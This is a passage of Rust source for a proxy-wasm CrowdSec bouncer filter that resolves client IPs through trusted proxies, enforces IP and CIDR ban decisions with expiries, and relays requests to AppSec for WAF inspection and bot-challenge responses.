use proxy_wasm::traits::*;
use proxy_wasm::types::*;
use serde::Deserialize;
use std::collections::HashMap;
use std::time::Duration;
use std::time::UNIX_EPOCH;

use crate::config::Config;

/// Shared-data keys holding the packed CIDR blobs synced from LAPI `Range` decisions.
/// Records are fixed-width and big-endian: an expiry, then a (base, mask) pair. Fixed
/// widths keep the per-request match a tight masking loop with no string parsing on the
/// hot path.
///
/// The `_v2` suffix is deliberate. Shared data outlives any single WASM VM and every
/// worker thread runs its own instance, so during a rolling update a new-format reader
/// can meet an old-format blob. Reading 8-byte records as 16-byte ones would silently
/// block the wrong addresses; a new key means stale blobs are ignored and rebuilt.
pub(crate) const RANGES_V4_KEY: &str = "crowdsec_ranges_v4_2";
pub(crate) const RANGES_V6_KEY: &str = "crowdsec_ranges_v6_2";

/// Key prefix for exact-IP decisions. Versioned for the same reason as the range keys:
/// the stored value gained an expiry prefix.
pub(crate) const IP_DECISION_PREFIX: &str = "ip2:";

/// Every stored decision starts with its expiry as big-endian epoch millis
pub(crate) const EXPIRY_LEN: usize = 8;

pub(crate) const RANGE_V4_CIDR_LEN: usize = 8;
pub(crate) const RANGE_V6_CIDR_LEN: usize = 32;
pub(crate) const RANGE_V4_RECORD: usize = EXPIRY_LEN + RANGE_V4_CIDR_LEN;
pub(crate) const RANGE_V6_RECORD: usize = EXPIRY_LEN + RANGE_V6_CIDR_LEN;

/// Split a stored decision into its expiry and payload.
///
/// Decisions carry their own lifetime, and honouring it is what stops a missed `deleted`
/// notification from banning an address forever: the entry simply stops matching when
/// the ban would have ended anyway.
pub(crate) fn split_expiry(value: &[u8]) -> Option<(u64, &[u8])> {
    if value.len() < EXPIRY_LEN {
        return None;
    }
    let (head, rest) = value.split_at(EXPIRY_LEN);
    let bytes: [u8; EXPIRY_LEN] = head.try_into().ok()?;
    Some((u64::from_be_bytes(bytes), rest))
}

/// Prefix a payload with its expiry for storage.
pub(crate) fn with_expiry(expires_at: u64, payload: &[u8]) -> Vec<u8> {
    let mut out = Vec::with_capacity(EXPIRY_LEN + payload.len());
    out.extend_from_slice(&expires_at.to_be_bytes());
    out.extend_from_slice(payload);
    out
}

/// Cap on the client headers relayed to AppSec, bounding VM memory per in-flight request
const MAX_FORWARDED_HEADER_BYTES: usize = 8 * 1024;

/// Bytes of body needed before the binary/text sniff is worth running
const SNIFF_PREFIX: usize = 512;

/// Strip the port suffix from an address that may be "ip:port" or "[ipv6]:port".
fn strip_port(addr: &str) -> String {
    if addr.starts_with('[') {
        // Bracketed IPv6: "[::1]:8080" → "::1"
        if let Some(close) = addr.find(']') {
            return addr[1..close].to_string();
        }
    } else if addr.matches(':').count() == 1 {
        // IPv4:port — exactly one colon means it is a port separator
        if let Some(idx) = addr.rfind(':') {
            return addr[..idx].to_string();
        }
    }
    // Bare IPv6 (multiple colons, no brackets) or plain IP: leave unchanged
    addr.to_string()
}

/// Parse a dotted-decimal IPv4 address into a u32.
fn parse_ipv4(s: &str) -> Option<u32> {
    let parts: Vec<&str> = s.split('.').collect();
    if parts.len() != 4 {
        return None;
    }
    let a = parts[0].parse::<u8>().ok()? as u32;
    let b = parts[1].parse::<u8>().ok()? as u32;
    let c = parts[2].parse::<u8>().ok()? as u32;
    let d = parts[3].parse::<u8>().ok()? as u32;
    Some((a << 24) | (b << 16) | (c << 8) | d)
}

/// Parse an IPv6 address into a u128, handling "::" compression and an embedded IPv4
/// tail ("::ffff:192.0.2.1"). Needed so trusted_ips and Range decisions work on IPv6
/// rather than degrading to an exact string comparison.
fn parse_ipv6(s: &str) -> Option<u128> {
    if s.is_empty() || !s.contains(':') {
        return None;
    }

    fn groups(part: &str) -> Option<Vec<u16>> {
        if part.is_empty() {
            return Some(Vec::new());
        }
        let mut out = Vec::new();
        for g in part.split(':') {
            if g.is_empty() {
                return None;
            }
            if g.contains('.') {
                let v4 = parse_ipv4(g)?;
                out.push((v4 >> 16) as u16);
                out.push((v4 & 0xffff) as u16);
                continue;
            }
            if g.len() > 4 {
                return None;
            }
            out.push(u16::from_str_radix(g, 16).ok()?);
        }
        Some(out)
    }

    let pack = |g: &[u16]| g.iter().fold(0u128, |acc, &v| (acc << 16) | v as u128);

    match s.find("::") {
        Some(i) => {
            let tail_str = &s[i + 2..];
            if tail_str.contains("::") {
                return None;
            }
            let head = groups(&s[..i])?;
            let tail = groups(tail_str)?;
            // "::" must stand in for at least one zero group
            if head.len() + tail.len() > 7 {
                return None;
            }
            let mut all = head;
            all.resize(8 - tail.len(), 0);
            all.extend(tail);
            Some(pack(&all))
        }
        None => {
            let all = groups(s)?;
            if all.len() != 8 {
                return None;
            }
            Some(pack(&all))
        }
    }
}

fn is_valid_ip(s: &str) -> bool {
    parse_ipv4(s).is_some() || parse_ipv6(s).is_some()
}

/// Return true if `ip` falls within `cidr`. Supports IPv4 and IPv6 CIDR notation, and a
/// bare address as an implicit /32 or /128.
fn ip_in_cidr(ip: &str, cidr: &str) -> bool {
    if ip.is_empty() || cidr.is_empty() {
        return false;
    }
    let (base, prefix_len) = match cidr.find('/') {
        Some(slash) => match cidr[slash + 1..].parse::<u32>() {
            Ok(n) => (&cidr[..slash], Some(n)),
            Err(_) => return false,
        },
        None => (cidr, None),
    };

    if let (Some(ip_v4), Some(base_v4)) = (parse_ipv4(ip), parse_ipv4(base)) {
        let prefix = prefix_len.unwrap_or(32);
        if prefix > 32 {
            return false;
        }
        let mask = if prefix == 0 {
            0u32
        } else {
            !0u32 << (32 - prefix)
        };
        return (ip_v4 & mask) == (base_v4 & mask);
    }

    if let (Some(ip_v6), Some(base_v6)) = (parse_ipv6(ip), parse_ipv6(base)) {
        let prefix = prefix_len.unwrap_or(128);
        if prefix > 128 {
            return false;
        }
        let mask = if prefix == 0 {
            0u128
        } else {
            !0u128 << (128 - prefix)
        };
        return (ip_v6 & mask) == (base_v6 & mask);
    }

    // Mixed families, or an address neither side can parse: only an exact literal match
    prefix_len.is_none() && ip == base
}

fn is_trusted_ip(ip: &str, trusted: &[String]) -> bool {
    trusted
        .iter()
        .any(|entry| !entry.is_empty() && ip_in_cidr(ip, entry))
}

/// Resolve the real client IP.
///
/// X-Forwarded-For is walked right-to-left, skipping hops that are themselves trusted
/// proxies, and the first untrusted hop wins. The leftmost entry must never be taken:
/// it is whatever the client sent, so a client behind a trusted proxy could otherwise
/// set it to any value and walk straight past both the LAPI blocklist and AppSec's
/// IP-scoped rules.
///
/// Returns None when the source address is missing or unparseable — the caller must then
/// apply the fail-open/fail-closed policy rather than continuing with an empty identity.
fn resolve_client_ip(source_ip: &str, xff: Option<&str>, trusted: &[String]) -> Option<String> {
    if !is_valid_ip(source_ip) {
        return None;
    }
    if trusted.is_empty() || !is_trusted_ip(source_ip, trusted) {
        return Some(source_ip.to_string());
    }
    // No XFF from a trusted proxy just means it did not add one: that is the direct
    // peer, not an unresolvable address
    let xff = match xff {
        Some(v) => v,
        None => return Some(source_ip.to_string()),
    };
    for entry in xff.rsplit(',') {
        let candidate = strip_port(entry.trim());
        // A malformed hop means the chain can no longer be reasoned about; everything
        // further left is unverifiable, so stop here
        if !is_valid_ip(&candidate) {
            break;
        }
        if !is_trusted_ip(&candidate, trusted) {
            return Some(candidate);
        }
    }
    Some(source_ip.to_string())
}

/// Pack a CIDR into the fixed-width key used inside the shared-data range blobs.
/// Returns (is_ipv6, key) with the base pre-masked so matching is a single AND.
/// The caller prepends the expiry to form a full record.
pub(crate) fn encode_range(cidr: &str) -> Option<(bool, Vec<u8>)> {
    let (base, prefix) = match cidr.find('/') {
        Some(slash) => (&cidr[..slash], Some(cidr[slash + 1..].parse::<u32>().ok()?)),
        None => (cidr, None),
    };

    if let Some(addr) = parse_ipv4(base) {
        let prefix = prefix.unwrap_or(32);
        if prefix > 32 {
            return None;
        }
        let mask = if prefix == 0 {
            0u32
        } else {
            !0u32 << (32 - prefix)
        };
        let mut record = Vec::with_capacity(RANGE_V4_CIDR_LEN);
        record.extend_from_slice(&(addr & mask).to_be_bytes());
        record.extend_from_slice(&mask.to_be_bytes());
        return Some((false, record));
    }

    if let Some(addr) = parse_ipv6(base) {
        let prefix = prefix.unwrap_or(128);
        if prefix > 128 {
            return None;
        }
        let mask = if prefix == 0 {
            0u128
        } else {
            !0u128 << (128 - prefix)
        };
        let mut record = Vec::with_capacity(RANGE_V6_CIDR_LEN);
        record.extend_from_slice(&(addr & mask).to_be_bytes());
        record.extend_from_slice(&mask.to_be_bytes());
        return Some((true, record));
    }

    None
}

fn format_v4(addr: u32) -> String {
    let o = addr.to_be_bytes();
    format!("{}.{}.{}.{}", o[0], o[1], o[2], o[3])
}

fn format_v6(addr: u128) -> String {
    (0..8)
        .map(|i| format!("{:x}", (addr >> (112 - i * 16)) as u16))
        .collect::<Vec<_>>()
        .join(":")
}

/// Scan a packed range blob for a CIDR containing `ip`, returning it in CIDR notation
/// for the block log.
fn match_v4_range(ip: u32, blob: &[u8], now: u64) -> Option<String> {
    for record in blob.as_chunks::<RANGE_V4_RECORD>().0 {
        let (expires_at, cidr) = match split_expiry(record) {
            Some(parts) => parts,
            None => continue,
        };
        if expires_at <= now {
            continue;
        }
        let base = u32::from_be_bytes([cidr[0], cidr[1], cidr[2], cidr[3]]);
        let mask = u32::from_be_bytes([cidr[4], cidr[5], cidr[6], cidr[7]]);
        if (ip & mask) == base {
            return Some(format!("{}/{}", format_v4(base), mask.leading_ones()));
        }
    }
    None
}

fn match_v6_range(ip: u128, blob: &[u8], now: u64) -> Option<String> {
    for record in blob.as_chunks::<RANGE_V6_RECORD>().0 {
        let (expires_at, cidr) = match split_expiry(record) {
            Some(parts) => parts,
            None => continue,
        };
        if expires_at <= now {
            continue;
        }
        let mut base_bytes = [0u8; 16];
        let mut mask_bytes = [0u8; 16];
        base_bytes.copy_from_slice(&cidr[..16]);
        mask_bytes.copy_from_slice(&cidr[16..]);
        let base = u128::from_be_bytes(base_bytes);
        let mask = u128::from_be_bytes(mask_bytes);
        if (ip & mask) == base {
            return Some(format!("{}/{}", format_v6(base), mask.leading_ones()));
        }
    }
    None
}

/// Request headers never relayed to AppSec. HTTP/2 pseudo-headers are rebuilt for the
/// dispatch, hop-by-hop and framing headers describe the client's connection rather than
/// the request, and `x-crowdsec-appsec-*` is our own control channel — relaying a
/// client-supplied one would let the client override the API key, IP, URI or verb that
/// AppSec evaluates.
fn is_forwardable_header(name: &str) -> bool {
    if name.starts_with(':') {
        return false;
    }
    let lower = name.to_lowercase();
    if lower.starts_with("x-crowdsec-appsec-") {
        return false;
    }
    !matches!(
        lower.as_str(),
        "content-length"
            | "transfer-encoding"
            | "connection"
            | "keep-alive"
            | "proxy-connection"
            | "upgrade"
            | "te"
            | "trailer"
            | "host"
    )
}

/// Snapshot the client's headers for later relay to AppSec, dropping the ones that must
/// not cross the boundary and stopping once the byte budget is spent.
fn collect_client_headers(headers: Vec<(String, String)>) -> Vec<(String, String)> {
    let mut total = 0;
    let mut out = Vec::new();
    for (name, value) in headers {
        if !is_forwardable_header(&name) {
            continue;
        }
        let cost = name.len() + value.len();
        if total + cost > MAX_FORWARDED_HEADER_BYTES {
            log::warn!(
                "Request headers exceed {} bytes, truncating the set relayed to AppSec",
                MAX_FORWARDED_HEADER_BYTES
            );
            break;
        }
        total += cost;
        out.push((name, value));
    }
    out
}

/// Whether a request body's declared Content-Type is one AppSec can meaningfully
/// inspect as text. Binary/compressed content types are candidates for skipping
/// (headers-only AppSec check) rather than forwarding, since raw binary noise scores as
/// highly anomalous under signature-based WAF rules and can trigger false-positive bans
/// on legitimate uploads.
fn body_is_inspectable(content_type: &str) -> bool {
    if content_type.is_empty() {
        return true;
    }
    let ct = content_type.to_lowercase();
    let media = ct.split(';').next().unwrap_or("").trim();
    matches!(
        media,
        "application/x-www-form-urlencoded"
            | "application/json"
            | "application/xml"
            | "application/soap+xml"
            | "application/xhtml+xml"
            | "application/graphql"
            | "application/csp-report"
    ) || media.starts_with("text/")
        || media.starts_with("multipart/")
        || media.ends_with("+json")
        || media.ends_with("+xml")
}

/// Does this body prefix actually look like binary? Three signals, any of which is
/// conclusive on its own for the encrypted/compressed/image payloads this exists to
/// spare from a text-oriented WAF:
///
/// - a NUL byte, which no text payload carries;
/// - a high proportion of control characters outside the usual whitespace set;
/// - a byte distribution that is both heavily non-ASCII and sprinkled with control
///   characters, which is what random or compressed data looks like. Neither half is
///   sufficient alone: CJK UTF-8 is ~100% non-ASCII with no control bytes, and random
///   data only reaches ~11% control bytes, well under the standalone threshold.
///
/// Deliberately *not* a UTF-8 validity check: that would let a single stray 0xff byte
/// appended to a text payload turn the skip back into a one-byte bypass.
fn looks_binary(prefix: &[u8]) -> bool {
    if prefix.is_empty() {
        return false;
    }
    let sample = &prefix[..prefix.len().min(SNIFF_PREFIX)];
    if sample.contains(&0) {
        return true;
    }
    let len = sample.len();
    let control = sample
        .iter()
        .filter(|b| **b < 0x09 || (**b > 0x0d && **b < 0x20) || **b == 0x7f)
        .count();
    let non_ascii = sample.iter().filter(|b| **b >= 0x80).count();
    control * 100 > len * 30 || (non_ascii * 100 > len * 40 && control * 100 > len * 5)
}

/// Whether the buffered body should go to AppSec.
///
/// The declared Content-Type only gets to *exclude* a body, and only when the bytes
/// agree with it. Content-Type is attacker-controlled, so trusting it alone turns
/// "skip binary uploads" into a one-header WAF bypass: a JSON injection payload sent as
/// `application/octet-stream` would never be inspected, while plenty of backends parse
/// the body regardless of what it claims to be.
fn should_forward_body(content_type: &str, prefix: &[u8]) -> bool {
    body_is_inspectable(content_type) || !looks_binary(prefix)
}

/// The Content-Type to relay for a body whose declared type claimed binary but whose
/// bytes are text.
///
/// Forwarding such a body under its declared type is not enough: AppSec selects its body
/// parser from Content-Type, so an `application/octet-stream` declaration leaves ARGS
/// unpopulated and the SQLi/XSS rules that target ARGS never fire — the payload is
/// relayed and then ignored. Re-label it from what the bytes actually are.
///
/// Anything that is not obviously JSON is labelled form-urlencoded rather than
/// text/plain: that populates ARGS_NAMES with the raw content even when it does not
/// parse as key=value pairs, which is the broadest rule coverage available.
fn sniff_content_type(body: &[u8]) -> &'static str {
    match body.iter().find(|b| !b.is_ascii_whitespace()) {
        Some(b'{') | Some(b'[') => "application/json",
        _ => "application/x-www-form-urlencoded",
    }
}

/// Whether the buffered body should be dispatched to AppSec now: only once per request,
/// when enough data has accumulated, the body was ruled out as binary, or the stream
/// ended — and never while a call is already in flight or a verdict already landed.
fn should_dispatch_appsec(
    pending: bool,
    done: bool,
    skipped: bool,
    body_len: usize,
    max_size: usize,
    end_of_stream: bool,
) -> bool {
    !pending && !done && (skipped || body_len >= max_size || end_of_stream)
}

/// AppSec bot-detection challenge envelope: sent with HTTP 403 in place of a classic
/// ban when the request should instead be served a proof-of-work/fingerprint challenge.
/// See https://docs.crowdsec.net/docs/next/appsec/bot_detection/challenge_protocol
#[derive(Deserialize)]
struct ChallengeEnvelope {
    action: String,
    http_status: u16,
    user_body_content: String,
    #[serde(default)]
    user_headers: HashMap<String, Vec<String>>,
    #[serde(default)]
    user_cookies: Vec<String>,
}

/// Parse an AppSec 403 response body as a challenge envelope.
/// Returns None for anything that isn't a well-formed `action: "challenge"` envelope,
/// so callers fall back to the classic ban response.
fn parse_challenge_envelope(body: &[u8]) -> Option<ChallengeEnvelope> {
    let envelope: ChallengeEnvelope = serde_json::from_slice(body).ok()?;
    if envelope.action != "challenge" {
        return None;
    }
    Some(envelope)
}

/// Add 'unsafe-eval' to a CSP's script-src (or default-src, if no script-src is
/// present) directive. CrowdSec's shipped bot-detection challenge page calls a
/// plain JS eval()/Function() (not just WebAssembly.instantiate - 'wasm-unsafe-eval'
/// alone is not enough, confirmed by Firefox's own "Missing 'unsafe-eval'" console
/// message) without allowing it in its own CSP. Firefox enforces this strictly while
/// Chromium is more lenient, breaking the challenge only in Firefox. No config-level
/// override exists upstream yet, so patch the header here before relaying it to the
/// client.
fn patch_csp_for_wasm(value: &str) -> String {
    let directives: Vec<&str> = value
        .split(';')
        .map(|p| p.trim())
        .filter(|p| !p.is_empty())
        .collect();

    if directives
        .iter()
        .any(|d| d.split_whitespace().next() == Some("script-src"))
    {
        return directives
            .into_iter()
            .map(|d| {
                if d.split_whitespace().next() == Some("script-src") && !d.contains("'unsafe-eval'")
                {
                    format!("{d} 'unsafe-eval'")
                } else {
                    d.to_string()
                }
            })
            .collect::<Vec<_>>()
            .join("; ");
    }

    // No script-src: derive one from default-src rather than adding 'unsafe-eval' to
    // default-src itself, which would loosen every fetch directive that inherits from it
    // (images, styles, connect, frames) and not just scripts.
    if let Some(default) = directives
        .iter()
        .find(|d| d.split_whitespace().next() == Some("default-src"))
    {
        let sources = default
            .split_whitespace()
            .skip(1)
            .collect::<Vec<_>>()
            .join(" ");
        let script_src = if sources.is_empty() {
            "script-src 'unsafe-eval'".to_string()
        } else {
            format!("script-src {sources} 'unsafe-eval'")
        };
        let mut out: Vec<String> = directives.iter().map(|d| d.to_string()).collect();
        out.push(script_src);
        return out.join("; ");
    }

    value.to_string()
}

/// Status codes a challenge response may set. AppSec is a semi-trusted network peer and
/// send_http_response relays whatever it is handed, so anything outside the HTTP range
/// falls back to a plain block rather than being passed through.
fn sanitize_challenge_status(status: u16) -> u32 {
    if (100..=599).contains(&status) {
        status as u32
    } else {
        403
    }
}

/// Header names a challenge response may set. AppSec controls both the names and the
/// values here, so restrict them to what a challenge page legitimately needs instead of
/// relaying arbitrary names - which would otherwise include pseudo-headers, hop-by-hop
/// headers, and framing headers that send_http_response sets itself.
fn is_allowed_challenge_header(name: &str) -> bool {
    matches!(
        name.to_lowercase().as_str(),
        "content-type"
            | "content-security-policy"
            | "content-security-policy-report-only"
            | "cache-control"
            | "pragma"
            | "expires"
            | "vary"
            | "referrer-policy"
            | "x-content-type-options"
            | "x-frame-options"
            | "set-cookie"
    )
}

/// Flatten a challenge envelope's user_headers and user_cookies into (name, value) pairs
/// for send_http_response. Each user_headers value list becomes one header per entry;
/// each user_cookies entry becomes one set-cookie header.
fn build_challenge_headers(envelope: &ChallengeEnvelope) -> Vec<(String, String)> {
    let mut headers = Vec::new();
    for (name, values) in &envelope.user_headers {
        if !is_allowed_challenge_header(name) {
            log::warn!("Dropping disallowed challenge header from AppSec: {}", name);
            continue;
        }
        for value in values {
            if name.eq_ignore_ascii_case("content-security-policy") {
                headers.push((name.clone(), patch_csp_for_wasm(value)));
            } else {
                headers.push((name.clone(), value.clone()));
            }
        }
    }
    for cookie in &envelope.user_cookies {
        headers.push(("set-cookie".to_string(), cookie.clone()));
    }
    headers
}

pub struct CrowdSecHttpContext {
    config: Config,
    ip: String,
    path: String,
    method: String,
    host: String,
    user_agent: String,
    content_type: String,
    client_headers: Vec<(String, String)>,
    body_data: Vec<u8>,
    has_body: bool,
    body_decided: bool,
    body_skipped: bool,
    appsec_pending: bool,
    appsec_done: bool,
    response_paused: bool,
}

impl CrowdSecHttpContext {
    pub fn new(config: Config) -> Self {
        Self {
            config,
            ip: String::new(),
            path: String::new(),
            method: String::new(),
            host: String::new(),
            user_agent: String::new(),
            content_type: String::new(),
            client_headers: Vec::new(),
            body_data: Vec::new(),
            has_body: false,
            body_decided: false,
            body_skipped: false,
            appsec_pending: false,
            appsec_done: false,
            response_paused: false,
        }
    }

    fn send_appsec_event(&mut self) {
        let body_len = self.body_data.len().to_string();
        let relayed_ct = self.relayed_content_type();
        let mut headers = vec![
            (":method", "POST"),
            (":path", "/"),
            (":authority", self.host.as_str()),
            ("X-Crowdsec-Appsec-Ip", self.ip.as_str()),
            ("X-Crowdsec-Appsec-Uri", self.path.as_str()),
            ("X-Crowdsec-Appsec-Host", self.host.as_str()),
            ("X-Crowdsec-Appsec-Verb", self.method.as_str()),
            ("X-Crowdsec-Appsec-User-Agent", self.user_agent.as_str()),
            (
                "X-Crowdsec-Appsec-Api-Key",
                self.config.crowdsec.appsec.key.as_str(),
            ),
            ("Content-Length", body_len.as_str()),
        ];
        // Relay the client's own headers so AppSec rules matching on Referer, Origin,
        // Cookie or any custom header can actually fire — forwarding only the metadata
        // leaves every header-based rule blind. collect_client_headers has already
        // dropped anything that must not cross this boundary.
        for (name, value) in &self.client_headers {
            // Content-Type is set below from the body we actually relay, not from what
            // the client declared
            if name.eq_ignore_ascii_case("content-type") {
                continue;
            }
            headers.push((name.as_str(), value.as_str()));
        }
        if let Some(ct) = &relayed_ct {
            headers.push(("Content-Type", ct.as_str()));
        }

        log::info!(
            "Sending AppSec event to cluster: {}, body length: {}, headers: {}",
            self.config.crowdsec.appsec.cluster,
            self.body_data.len(),
            headers.len()
        );

        match self.dispatch_http_call(
            &self.config.crowdsec.appsec.cluster,
            headers,
            Some(&self.body_data),
            vec![],
            Duration::from_millis(2000),
        ) {
            Ok(call_id) => {
                self.appsec_pending = true;
                log::info!(
                    "AppSec call dispatched successfully with call_id: {}",
                    call_id
                );
            }
            Err(e) => {
                log::error!("Failed to dispatch AppSec call: {:?}", e);
                self.appsec_pending = false;
                // Async mode always passes; fail_open passes on errors
                if self.config.crowdsec.appsec.async_mode || self.config.crowdsec.appsec.fail_open {
                    self.allow_and_resume();
                } else {
                    self.send_http_response(
                        403,
                        vec![("content-type", "text/plain")],
                        Some(b"AppSec Access Denied"),
                    );
                }
            }
        }
    }

    fn allow_and_resume(&mut self) {
        self.appsec_done = true;
        self.resume_http_request();
        if self.response_paused {
            self.resume_http_response();
        }
    }

    fn max_body_size(&self) -> usize {
        (self.config.crowdsec.appsec.max_body_size_kb as usize).saturating_mul(1024)
    }

    fn max_response_body_size(&self) -> usize {
        (self.config.crowdsec.appsec.max_response_body_size_kb as usize).saturating_mul(1024)
    }

    /// Whether this request carries a body we should buffer for AppSec.
    ///
    /// Driven by body presence, not a method allowlist: DELETE bodies are ordinary in
    /// REST APIs, plenty of frameworks read a body off GET and OPTIONS, and the method
    /// string is compared case-sensitively — so an allowlist leaves all of those
    /// uninspected.
    fn request_has_body(&self) -> bool {
        self.config.crowdsec.appsec.forward_body && self.has_body
    }

    /// Run the binary/text sniff once, and drop the buffer if the body really is binary.
    /// Deciding here on the bytes, rather than up front on the declared Content-Type,
    /// is what stops a mislabelled payload from skipping inspection.
    fn decide_body_forwarding(&mut self) {
        if self.body_decided {
            return;
        }
        self.body_decided = true;
        if !should_forward_body(&self.content_type, &self.body_data) {
            log::info!(
                "Body bytes look binary (content-type: {}), headers-only AppSec check",
                self.content_type
            );
            self.body_skipped = true;
            self.body_data.clear();
            self.body_data.shrink_to_fit();
        }
    }

    /// Content-Type to send with the relayed body, or None when no body is relayed.
    fn relayed_content_type(&self) -> Option<String> {
        if self.body_data.is_empty() {
            return None;
        }
        if !self.content_type.is_empty() && body_is_inspectable(&self.content_type) {
            return Some(self.content_type.clone());
        }
        // A body with no declared type at all gets sniffed too, rather than relayed with
        // an empty Content-Type that leaves AppSec no parser to pick
        let sniffed = sniff_content_type(&self.body_data);
        if !self.content_type.is_empty() {
            log::info!(
                "Body declared as {} but its bytes are text, relaying to AppSec as {}",
                self.content_type,
                sniffed
            );
        }
        Some(sniffed.to_string())
    }

    /// Single dispatch point shared by the body and trailer callbacks.
    fn finalize_and_dispatch(&mut self, end_of_stream: bool) {
        if self.appsec_pending || self.appsec_done {
            return;
        }
        let max_size = self.max_body_size();
        if self.body_data.len() >= max_size || end_of_stream {
            self.decide_body_forwarding();
        }
        if should_dispatch_appsec(
            self.appsec_pending,
            self.appsec_done,
            self.body_skipped,
            self.body_data.len(),
            max_size,
            end_of_stream,
        ) {
            log::info!(
                "Dispatching AppSec: {} bytes, end_of_stream={}",
                self.body_data.len(),
                end_of_stream
            );
            self.send_appsec_event();
        }
    }

    /// Check the client IP against both the per-IP decisions and the synced CIDR ranges.
    fn is_ip_blocked(&self) -> bool {
        // A failed clock read yields 0, which makes every decision look unexpired. That
        // over-blocks rather than under-blocks, which is the safe direction for a ban.
        let now = self.now_millis();
        let key = format!("{}{}", IP_DECISION_PREFIX, self.ip);
        let (decision_data, _) = self.get_shared_data(&key);
        if let Some(decision) = decision_data {
            if let Some((expires_at, reason)) = split_expiry(&decision) {
                if expires_at > now {
                    log::warn!(
                        "Blocking IP {}: {}",
                        self.ip,
                        String::from_utf8_lossy(reason)
                    );
                    return true;
                }
                // Removal is left to the sync path, which is the single writer under the
                // sync lock. Cleaning up here would mean every worker thread issuing CAS
                // writes to shared data on the request hot path.
                log::debug!("Decision for IP {} has expired, ignoring", self.ip);
            }
        }
        // Range-scope decisions are stored as packed CIDR blobs rather than per-IP keys.
        // Without this check every CIDR ban LAPI sends would be synced and then silently
        // ignored — and community blocklists are largely CIDR.
        if let Some(cidr) = self.matched_banned_range() {
            log::warn!("Blocking IP {}: inside banned range {}", self.ip, cidr);
            return true;
        }
        false
    }

    fn matched_banned_range(&self) -> Option<String> {
        let now = self.now_millis();
        if let Some(ip) = parse_ipv4(&self.ip) {
            let (blob, _) = self.get_shared_data(RANGES_V4_KEY);
            return blob.and_then(|b| match_v4_range(ip, &b, now));
        }
        if let Some(ip) = parse_ipv6(&self.ip) {
            let (blob, _) = self.get_shared_data(RANGES_V6_KEY);
            return blob.and_then(|b| match_v6_range(ip, &b, now));
        }
        None
    }

    fn now_millis(&self) -> u64 {
        self.get_current_time()
            .duration_since(UNIX_EPOCH)
            .map(|d| d.as_millis() as u64)
            .unwrap_or(0)
    }
}

impl Context for CrowdSecHttpContext {
    fn on_http_call_response(
        &mut self,
        token_id: u32,
        _num_headers: usize,
        body_size: usize,
        _num_trailers: usize,
    ) {
        log::info!(
            "AppSec response received - token_id: {}, body_size: {}",
            token_id,
            body_size
        );
        self.appsec_pending = false;

        let status = self
            .get_http_call_response_header(":status")
            .unwrap_or_else(|| "503".to_string())
            .parse::<u32>()
            .unwrap_or(503);

        log::info!("AppSec response status: {}", status);

        // Async mode: request already passed through, never block
        if self.config.crowdsec.appsec.async_mode {
            log::info!(
                "Async mode: AppSec result {} ignored, request already allowed",
                status
            );
            self.appsec_done = true;
            return;
        }

        if status == 200 {
            log::info!("AppSec allows request, resuming");
            self.allow_and_resume();
        } else if status == 403 {
            let max_response_size = self.max_response_body_size();
            let body = if body_size == 0 {
                None
            } else if body_size > max_response_size {
                log::error!(
                    "AppSec response body too large ({} bytes, max {}), falling back to classic block",
                    body_size,
                    max_response_size
                );
                None
            } else {
                self.get_http_call_response_body(0, body_size)
            };
            let challenge = body.as_deref().and_then(parse_challenge_envelope);

            if let Some(challenge) = challenge {
                log::warn!(
                    "AppSec issuing bot-detection challenge to {} (http_status: {})",
                    self.ip,
                    challenge.http_status
                );
                let headers = build_challenge_headers(&challenge);
                let header_refs: Vec<(&str, &str)> = headers
                    .iter()
                    .map(|(name, value)| (name.as_str(), value.as_str()))
                    .collect();
                self.send_http_response(
                    sanitize_challenge_status(challenge.http_status),
                    header_refs,
                    Some(challenge.user_body_content.as_bytes()),
                );
            } else {
                log::warn!(
                    "AppSec blocking request from {} (status: {})",
                    self.ip,
                    status
                );
                self.send_http_response(
                    403,
                    vec![("content-type", "text/plain")],
                    Some(b"AppSec Access Denied"),
                );
            }
        } else {
            // Any other status (401 bad api key, 500, 503, etc.) is an AppSec failure
            log::error!("AppSec request failed with status: {}", status);
            if self.config.crowdsec.appsec.fail_open {
                log::info!("Fail open enabled, allowing request");
                self.allow_and_resume();
            } else {
                log::warn!("Fail open disabled, denying request");
                self.send_http_response(
                    403,
                    vec![("content-type", "text/plain")],
                    Some(b"AppSec Access Denied"),
                );
            }
        }
    }
}

impl HttpContext for CrowdSecHttpContext {
    fn on_http_request_headers(&mut self, _num_headers: usize, end_of_stream: bool) -> Action {
        // Resolve the direct connecting address and strip any port suffix.
        let source_ip = self
            .get_property(vec!["source", "address"])
            .and_then(|bytes| String::from_utf8(bytes).ok())
            .map(|addr| strip_port(&addr))
            .unwrap_or_default();

        let xff = self.get_http_request_header("x-forwarded-for");
        self.ip = match resolve_client_ip(
            &source_ip,
            xff.as_deref(),
            &self.config.crowdsec.trusted_ips,
        ) {
            Some(ip) => ip,
            None => {
                // Continuing with an empty identity would silently disable the blocklist
                // lookup and send AppSec a blank IP, so treat it as a failure instead.
                log::error!(
                    "Cannot determine client IP (source address: {:?}), applying fail policy",
                    source_ip
                );
                if self.config.crowdsec.appsec.fail_open {
                    return Action::Continue;
                }
                self.send_http_response(
                    403,
                    vec![("content-type", "text/plain")],
                    Some(b"Access Denied"),
                );
                return Action::Pause;
            }
        };

        self.path = self.get_http_request_header(":path").unwrap_or_default();
        self.method = self.get_http_request_header(":method").unwrap_or_default();
        self.user_agent = self
            .get_http_request_header("user-agent")
            .unwrap_or_default();
        self.host = self
            .get_http_request_header(":authority")
            .unwrap_or_default();

        log::info!("Request: {} {} from {}", self.method, self.path, self.ip);

        // Check IP blocking
        if self.config.crowdsec.lapi.enabled && self.is_ip_blocked() {
            self.send_http_response(
                403,
                vec![("content-type", "text/plain")],
                Some(b"Access Denied"),
            );
            return Action::Pause;
        }

        if !self.config.crowdsec.appsec.enabled {
            return Action::Continue;
        }

        self.client_headers = collect_client_headers(self.get_http_request_headers());
        self.content_type = self
            .get_http_request_header("content-type")
            .unwrap_or_default();

        let content_length = self
            .get_http_request_header("content-length")
            .and_then(|v| v.trim().parse::<usize>().ok())
            .unwrap_or(0);
        self.has_body = !end_of_stream || content_length > 0;

        if self.request_has_body() {
            if !end_of_stream {
                log::info!("Request has a body, waiting for body data");
                return Action::Continue;
            }
            // Body arrived with headers (end_of_stream=true): read it now
            let max_size = self.max_body_size();
            match self.get_http_request_body(0, max_size) {
                Some(body) => {
                    log::info!("Read {} bytes of body at headers", body.len());
                    self.body_data = body;
                }
                None => log::warn!("get_http_request_body(0, {}) returned None", max_size),
            }
            self.decide_body_forwarding();
        }

        // No body, or the whole body is already buffered: dispatch AppSec
        self.send_appsec_event();
